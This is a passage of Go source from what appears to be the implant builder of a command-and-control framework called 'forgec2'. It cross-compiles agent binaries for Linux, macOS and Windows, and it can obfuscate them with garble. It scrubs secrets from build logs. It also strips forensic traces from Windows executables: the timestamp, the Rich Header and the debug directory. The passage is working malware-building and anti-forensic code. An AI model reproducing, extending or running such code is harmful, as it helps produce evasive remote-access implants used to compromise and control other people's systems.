		if end < 0 {
			continue
		}
		secret := ldflags[start : start+end]
		if secret != "" {
			output = strings.ReplaceAll(output, secret, "[redacted]")
		}
	}
	return output
}

// buildAgentBinary runs `go build` or `garble build` with consistent hardening flags.
// When obfuscate is requested, garble is REQUIRED: falling back to a plain
// build would silently produce an un-obfuscated implant (a false security
// promise), so a missing/broken garble fails the build instead.
func buildAgentBinary(goCmd, workDir, ldflags, outPath string, obfuscate bool, goos, goarch, configBlob, sConfigKey string) error {
	ctx, cancel := context.WithTimeout(context.Background(), buildCompileTimeout)
	defer cancel()
	if err := writeConfigInjectFile(workDir, configBlob, sConfigKey); err != nil {
		return fmt.Errorf("write config inject file: %w", err)
	}
	if obfuscate {
		garblePath := getGarbleCmd()
		if garblePath == "" {
			return fmt.Errorf("obfuscation requested but garble is not installed: install it with `go install mvdan.cc/garble@latest`")
		}
		args := append([]string{"-literals", "-tiny", "-seed=random", "build"},
			"-ldflags", ldflags, "-o", outPath, "-trimpath", "-buildvcs=false", ".")
		cmd := exec.CommandContext(ctx, garblePath, args...)
		cmd.Dir = workDir
		cmd.Env = append(os.Environ(), "GOOS="+goos, "GOARCH="+goarch, "CGO_ENABLED=0")
		var stderr bytes.Buffer
		cmd.Stderr = &stderr
		if err := cmd.Run(); err != nil {
			if ctx.Err() == context.DeadlineExceeded {
				return fmt.Errorf("garble build timed out after %s: %w", buildCompileTimeout, err)
			}
			return fmt.Errorf("garble build failed: %w\n%s\n(re-run without obfuscation or fix the garble install)", err, scrubBuildLog(stderr.String(), ldflags))
		}
		return nil
	}
	cmd := exec.CommandContext(ctx, goCmd, append([]string{"build"},
		"-ldflags", ldflags,
		"-o", outPath,
		"-trimpath",
		"-buildvcs=false",
		".",
	)...)
	cmd.Dir = workDir
	cmd.Env = append(os.Environ(), "GOOS="+goos, "GOARCH="+goarch, "CGO_ENABLED=0")
	var stderr bytes.Buffer
	cmd.Stderr = &stderr
	if err := cmd.Run(); err != nil {
		if ctx.Err() == context.DeadlineExceeded {
			return fmt.Errorf("go build timed out after %s: %w", buildCompileTimeout, err)
		}
		return fmt.Errorf("go build failed: %w\n%s", err, scrubBuildLog(stderr.String(), ldflags))
	}
	return nil
}

// stripPEArtifacts removes forensic PE artifacts: timestamp, Rich Header, Debug Directory.
func stripPEArtifacts(path string) {
	data, err := os.ReadFile(path)
	if err != nil || len(data) < 0x100 {
		return
	}
	if data[0] != 'M' || data[1] != 'Z' {
		return // not a PE file
	}
	// e_lfanew is a 32-bit little-endian offset to the PE signature. Reading
	// only 2 bytes (as before) is wrong and, for any exe whose e_lfanew does
	// not fit in 16 bits, would compute a garbage offset and corrupt the file.
	if 0x40 > len(data) {
		return
	}
	e_lfanew := int(data[0x3C]) | int(data[0x3D])<<8 | int(data[0x3E])<<16 | int(data[0x3F])<<24
	if e_lfanew < 0 || e_lfanew+4 >= len(data) {
		return
	}
	if string(data[e_lfanew:e_lfanew+4]) != "PE\x00\x00" {
		return // malformed PE
	}

	// Optional header magic selects PE32 (0x10b) vs PE32+ (0x20b); the data
	// directory array lives at a different offset in each, so zeroing the
	// debug directory at a hardcoded PE64 offset on a PE32 binary corrupts it.
	if e_lfanew+0x18+2 > len(data) {
		return
	}
	magic := int(data[e_lfanew+0x18]) | int(data[e_lfanew+0x19])<<8
	dataDirBase := e_lfanew + 0x70 // PE32+ (amd64/arm64)
	if magic == 0x10b {
		dataDirBase = e_lfanew + 0x60 // PE32 (386)
	}

	// 1. Zero timestamp at PE+8
	tsOffset := e_lfanew + 8
	if tsOffset+4 <= len(data) {
		for i := range 4 {
			data[tsOffset+i] = 0
		}
	}

	// 2. Zero Rich Header (between DOS stub and PE signature). Search backwards
	// from the PE signature for the "Rich" magic.
	richStart := 0
	for i := e_lfanew - 4; i >= 0x80; i-- {
		if data[i] == 'R' && data[i+1] == 'i' && data[i+2] == 'c' && data[i+3] == 'h' {
			richStart = i
			break
		}
	}
	if richStart > 0 {
		// Zero from Rich marker to PE signature
		for i := richStart; i < e_lfanew; i++ {
			data[i] = 0
		}
	}

	// 3. Clear Debug Directory entry in data directory
	// Data directory index 6 = IMAGE_DIRECTORY_ENTRY_DEBUG
	debugDirOffset := dataDirBase + 6*8
	if debugDirOffset+8 <= len(data) {
		for i := range 8 {
			data[debugDirOffset+i] = 0
		}
	}

	os.WriteFile(path, data, 0644)
}

// windowsMachine maps the requested architecture to the PE Machine field so we
// can assert the produced binary is the architecture the operator asked for.
func windowsMachine(arch string) uint16 {
	switch arch {
	case "arm64":
		return 0xAA64
	case "386":
		return 0x014c
	default:
		return 0x8664 // amd64
	}
}

// supportedArchByOS lists the architectures the embedded agent actually builds
// and runs for each target OS. Architectures outside this set (e.g. 32-bit
// Windows 386) must be rejected explicitly rather than silently cross-compiled
// to amd64, which would ship a binary that fails to run on the operator's
// target ("This app can't run on your PC") while passing PE validation.
var supportedArchByOS = map[string][]string{
	"windows": {"amd64", "arm64"},
	"linux":   {"amd64", "arm64", "arm"},
	"darwin":  {"amd64", "arm64"},
}

// normalizeArch canonicalizes common architecture aliases to Go's GOARCH value.
func normalizeArch(arch string) string {
	arch = strings.ToLower(strings.TrimSpace(arch))
	switch arch {
	case "x86_64":
		return "amd64"
	case "aarch64":
		return "arm64"
	case "i386", "x86", "386":
		return "386"
	case "arm":
		return "arm"
	}
	return arch
}

// resolveBuildArch returns the GOARCH to build for the given OS/arch, or an
// error if that combination is unsupported. This makes architecture selection
// honest: an unsupported request fails the build loudly instead of silently
// producing a different (wrong) architecture.
func resolveBuildArch(goos, arch string) (string, error) {
	a := normalizeArch(arch)
	for _, s := range supportedArchByOS[goos] {
		if s == a {
			return a, nil
		}
	}
	return "", fmt.Errorf("architecture %q is not supported for %s implants; supported: %s",
		arch, goos, strings.Join(supportedArchByOS[goos], ", "))
}

// validatePE confirms path is a well-formed PE for the expected machine type
// (0x8664 amd64, 0x014c 386, 0xAA64 arm64). A malformed or wrong-architecture
// binary must never be delivered to an operator — doing so produces a file
// Windows rejects with "This app can't run on your PC". Validating here turns
// any such regression (bad strip, broken ldflags, wrong GOARCH) into a clear
// build failure instead of a silently corrupted download.
func validatePE(path string, machine uint16) error {
	data, err := os.ReadFile(path)
	if err != nil {
		return err
	}
	if len(data) < 0x40 || data[0] != 'M' || data[1] != 'Z' {
		return fmt.Errorf("not a PE (missing MZ header)")
	}
	if 0x40 > len(data) {
		return fmt.Errorf("truncated PE")
	}
	e_lfanew := int(data[0x3C]) | int(data[0x3D])<<8 | int(data[0x3E])<<16 | int(data[0x3F])<<24
	if e_lfanew < 0 || e_lfanew+4 >= len(data) || string(data[e_lfanew:e_lfanew+4]) != "PE\x00\x00" {
		return fmt.Errorf("missing PE signature")
	}
	if e_lfanew+4+2 > len(data) {
		return fmt.Errorf("truncated COFF header")
	}
	got := uint16(data[e_lfanew+4]) | uint16(data[e_lfanew+5])<<8
	if got != machine {
		return fmt.Errorf("unexpected PE machine 0x%04x, wanted 0x%04x", got, machine)
	}
	return nil
}

// GenerateLinuxELF builds a Linux ELF agent binary via cross-compilation.
func GenerateLinuxELF(cfg ImplantConfig, outputDir string) (string, error) {
	dataDir := filepath.Dir(outputDir)
	profile := NormalizeImplantConfig(&cfg, dataDir)
	if cfg.UserAgent == defaultWindowsUA {
		cfg.UserAgent = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
	}

	tmpDir, err := os.MkdirTemp("", "forgec2-agent-linux-*")
	if err != nil {
		return "", err
	}
	defer os.RemoveAll(tmpDir)

	if !filepath.IsAbs(outputDir) {
		if abs, err := filepath.Abs(outputDir); err == nil {
			outputDir = abs
		}
	}

	if err := extractAgentSources(payloadFS, tmpDir); err != nil {
		return "", err
	}

	goMod := buildGoMod("linux", false)
	if err := os.WriteFile(filepath.Join(tmpDir, "go.mod"), []byte(goMod), 0644); err != nil {
		return "", err
	}

	ldflags, blob, sKey := buildLdflags(cfg, profile, "linux")

	outName := cfg.Filename
	if outName == "" {
		outName = "forgec2_agent"
	}
	// Linux binaries typically have no .exe
	if strings.HasSuffix(strings.ToLower(outName), ".exe") {
		outName = outName[:len(outName)-4]
	}
	outName = safeBuildFileName(outName)
	outPath := filepath.Join(outputDir, outName)
	if !filepath.IsAbs(outPath) {
		if abs, err := filepath.Abs(outPath); err == nil {
			outPath = abs
		}
	}
	outDir := filepath.Dir(outPath)
	if err := os.MkdirAll(outDir, 0750); err != nil {
		return "", err
	}

	goCmd := getGoCmd()
	if goCmd == "" {
		return "", fmt.Errorf("go executable not found in PATH. Install Go from https://go.dev/dl/ or set the GO_BINARY environment variable")
	}
	if err := runGoModTidy(goCmd, tmpDir); err != nil {
		return "", err
	}
	goarch, err := resolveBuildArch("linux", cfg.Architecture)
	if err != nil {
		return "", err
	}
	if err := buildAgentBinary(goCmd, tmpDir, ldflags, outPath, cfg.Obfuscate, "linux", goarch, blob, sKey); err != nil {
		return "", err
	}

	if _, err := os.Stat(outPath); err != nil {
		return "", fmt.Errorf("build succeeded but no output file at %s: %w", outPath, err)
	}

	if cfg.SelfCheck {
		if err := patchSelfCheckHash(outPath); err != nil {
			return "", err
		}
	}

	return outPath, nil
}

// GenerateMacOS builds a macOS agent binary via cross-compilation.
func GenerateMacOS(cfg ImplantConfig, outputDir string) (string, error) {
	dataDir := filepath.Dir(outputDir)
	profile := NormalizeImplantConfig(&cfg, dataDir)
	if cfg.UserAgent == defaultWindowsUA {
		cfg.UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
	}

	tmpDir, err := os.MkdirTemp("", "forgec2-agent-macos-*")
	if err != nil {
		return "", err
	}
	defer os.RemoveAll(tmpDir)

	if !filepath.IsAbs(outputDir) {
		if abs, err := filepath.Abs(outputDir); err == nil {
			outputDir = abs
		}
	}

	if err := extractAgentSources(payloadFS, tmpDir); err != nil {
		return "", err
	}

	goMod := buildGoMod("darwin", false)
	if err := os.WriteFile(filepath.Join(tmpDir, "go.mod"), []byte(goMod), 0644); err != nil {
		return "", err
	}

	ldflags, blob, sKey := buildLdflags(cfg, profile, "darwin")

	outName := cfg.Filename
	if outName == "" {
		outName = "forgec2_agent"
	}
	outName = safeBuildFileName(outName)
	outPath := filepath.Join(outputDir, outName)
	if !filepath.IsAbs(outPath) {
		if abs, err := filepath.Abs(outPath); err == nil {
			outPath = abs
		}
	}
	outDir := filepath.Dir(outPath)
	if err := os.MkdirAll(outDir, 0750); err != nil {
		return "", err
	}

	goCmd := getGoCmd()
	if goCmd == "" {
		return "", fmt.Errorf("go executable not found in PATH. Install Go from https://go.dev/dl/ or set the GO_BINARY environment variable")
	}
	if err := runGoModTidy(goCmd, tmpDir); err != nil {
		return "", err
	}
	goarch, err := resolveBuildArch("darwin", cfg.Architecture)
	if err != nil {
		return "", err
	}
	if err := buildAgentBinary(goCmd, tmpDir, ldflags, outPath, cfg.Obfuscate, "darwin", goarch, blob, sKey); err != nil {
		return "", err
	}

	if _, err := os.Stat(outPath); err != nil {
		return "", fmt.Errorf("build succeeded but no output file at %s: %w", outPath, err)
	}

	if cfg.SelfCheck {
		if err := patchSelfCheckHash(outPath); err != nil {
			return "", err
		}
	}

	return outPath, nil
}

// Note: Agents are ONLY produced via the Generate page (EXE + PS1 + Linux ELF + macOS).
// The PS1 template lives in powershell_template.ps1 as the canonical implementation.
